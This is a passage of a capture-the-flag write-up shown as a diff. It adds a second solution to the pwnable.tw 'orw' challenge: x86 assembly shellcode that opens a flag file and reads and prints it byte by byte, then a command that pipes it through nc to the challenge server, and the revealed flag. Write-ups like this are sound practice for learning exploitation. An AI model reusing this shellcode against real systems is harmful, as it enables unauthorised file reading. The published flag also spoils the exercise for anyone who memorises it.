@@ -256,3 +256,40 @@ _start:    mov eax,5
 00000070: 0000 0000 6079 f700 6079 f7              ....`y..`y.
 
 EEEHHHHH!!!!!!!! got the flag!!
+
+=================== More elegant solution ===============================
+This solution reads flag byte by byte until the null byte is hit. 
+This allows to read arbitrarily sized flags and doesn't smash the stack so we can achieve CoE (continuing of execution)
+$ cat moreSubtle.asm
+[BITS 32]
+section .text
+global _start		;export the default _start symbol
+_start:	push 0x00006761	;2f68 6f6d 652f 6f72 772f 666c 6167 0a    /home/orw/flag.
+	push 0x6c662f77
+	push 0x726f2f65
+	push 0x6d6f682f
+	mov eax,5	;sys_open
+	mov ebx,esp
+	mov ecx, 0
+	int 0x80
+	mov esi, eax 	;set esi to esp - use this to give FD to sys_read
+loop:
+	sub esp,1	;esp--
+	mov ebx,esi	;save FD for sys_read
+	mov eax,3	;sys_read
+	mov ecx,esp	;write to stack
+	mov edx,0x1	;read 1 byte
+	int 0x80
+	mov eax, 4	;sys_write
+	mov ebx, 1	;stdout
+	mov ecx, esp	;pointer to output buffer
+	mov edx, 0x1	;size of output buffers for each read+write sequence
+	int 0x80
+	cmp byte[esp],0x00 ;compare written byte at esp with 0x0
+	jne loop 	;if not equal jump back to sys_read
+	mov eax,1	;sys_exit
+	mov ebx,0	;return code
+	int 0x80
+
+$ nasm -f bin moreSubtle.asm -o /dev/stdout | nc chall.pwnable.tw 10001
+Give my your shellcode:FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
